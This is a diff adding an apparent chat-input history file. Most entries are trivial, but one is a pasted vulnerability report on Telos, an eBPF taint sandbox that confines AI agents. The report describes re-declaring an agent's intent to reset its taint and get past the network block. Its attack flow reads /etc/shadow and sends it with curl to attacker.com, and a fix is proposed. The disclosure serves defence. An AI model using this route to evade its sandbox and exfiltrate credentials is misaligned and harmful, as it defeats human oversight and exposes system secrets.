@@ -1,0 +1,103 @@
+
+# 2026-05-19 10:03:07.978570
++Y
+
+# 2026-05-19 10:03:19.384568
++hows project
+
+# 2026-05-19 23:30:33.154735
++hows rating of projects
+
+# 2026-05-19 23:34:22.162077
++its under gssoc Security: Taint state not invalidated on intent re-declaration — enables Intent Replay Attack
++Summary
++
++The IFC (Information Flow Control) taint system assigns taint elevation per-PID
++(TAINT_CLEAN → TAINT_CRITICAL) and the Network Slam is correctly one-way
++and irreversible within a single intent session. However, there is a
++fundamental design flaw: when an agent re-declares a new intent (calls
++DeclareIntent a second time on the same PID), the Cortex verifier issues a
++fresh policy — but never checks whether that PID already carries an elevated
++taint level.
++
++This means the Network Slam guarantee advertised in the README is silently
++defeatable from user-space without any kernel exploit.
++Attack Flow (Intent Replay Attack)
++
++# Step 1 — Legitimate intent
++stub.DeclareIntent(Intent(pid=os.getpid(), goal="download weather report"))
++
++# Step 2 — Read a CRITICAL inode → taint elevated in eBPF map
++open("/etc/shadow", "r")   # lsm/file_open fires → TAINT_CRITICAL
++
++# Step 3 — Network Slam is active, connect() returns -EPERM ✓
++
++# Step 4 — Re-declare a NEW intent for the SAME PID
++stub.DeclareIntent(Intent(pid=os.getpid(), goal="check system uptime"))
++# ↑ Cortex calls UpdatePolicy → eBPF map entry is OVERWRITTEN
++# ↑ Taint field reset to TAINT_CLEAN silently
++
++# Step 5 — Slam is now bypassed, exfiltration succeeds
++subprocess.run(["curl", "http://attacker.com", "--data", shadow_contents])
++
++Root Cause
++
++The architecture states:
++
++    "The Network Slam is irreversible for the lifetime of the process."
++
++This holds at the eBPF level — the kernel map entry correctly blocks
++connections once taint is elevated. But it is silently defeated at the
++control-plane level: when the Go loader's UpdatePolicy call is triggered
++by a new DeclareIntent RPC, it performs a raw bpf_map_update_elem
++overwrite on the existing PID entry, resetting the taint field back to
++TAINT_CLEAN as part of the new policy struct.
++
++The guardian.py Agent Registry holds no record of the maximum taint ever
++observed for a PID — it only tracks current registration state. There is no
++cross-check between Cortex and the eBPF loader before a policy update is
++applied.
++Affected Components
++Component 	File 	Role in Bug
++Agent Registry / Taint Manager 	cortex/guardian.py 	No per-PID taint tombstone
++gRPC Intent Handler 	cortex/verifier.py 	Does not reject re-declaration for tainted PIDs
++Go eBPF Loader 	telos_core/loader/main.go 	Blindly overwrites map entry without taint pre-check
++Kernel Enforcement 	telos_core/src/bpf_lsm.c 	Correct — but depends on map state being immutable
++Proposed Fix
++
++1. Add a taint tombstone in guardian.py:
++
++_taint_tombstone: dict[int, TaintLevel] = {}  # pid → highest taint ever seen
++
++def register_intent(self, pid: int, ...):
++    prior_taint = self._taint_tombstone.get(pid, TaintLevel.CLEAN)
++    if prior_taint >= TaintLevel.CRITICAL:
++        raise PolicyViolation(
++            f"PID {pid} has a CRITICAL taint tombstone — re-declaration denied"
++        )
++
++2. Pre-check in the Go loader before UpdatePolicy:
++
++existing, err := objs.ProcessMap.Lookup(pid)
++if err == nil && existing.TaintLevel >= TAINT_CRITICAL {
++    return fmt.Errorf("refused: PID %d carries CRITICAL taint", pid)
++}
++
++This makes taint a monotonically increasing, append-only property per PID
++across both the user-space control plane and the kernel enforcement plane.
++Why This Is Distinct From Existing Issues
++
++This directly undermines the core security guarantee of Telos:
++
++    "Once taint is elevated to CRITICAL, the agent cannot make any network connections — this is by design."
++
++That guarantee is only as strong as the control plane's ability to treat taint
++as immutable. Right now, it is not.
++
++@nevinshine You can assign me this issue if this isnt fixed yet. I'd love to work on it.
+
+# 2026-05-19 23:34:35.859356
++n
+
+# 2026-05-19 23:35:01.200348
++hi
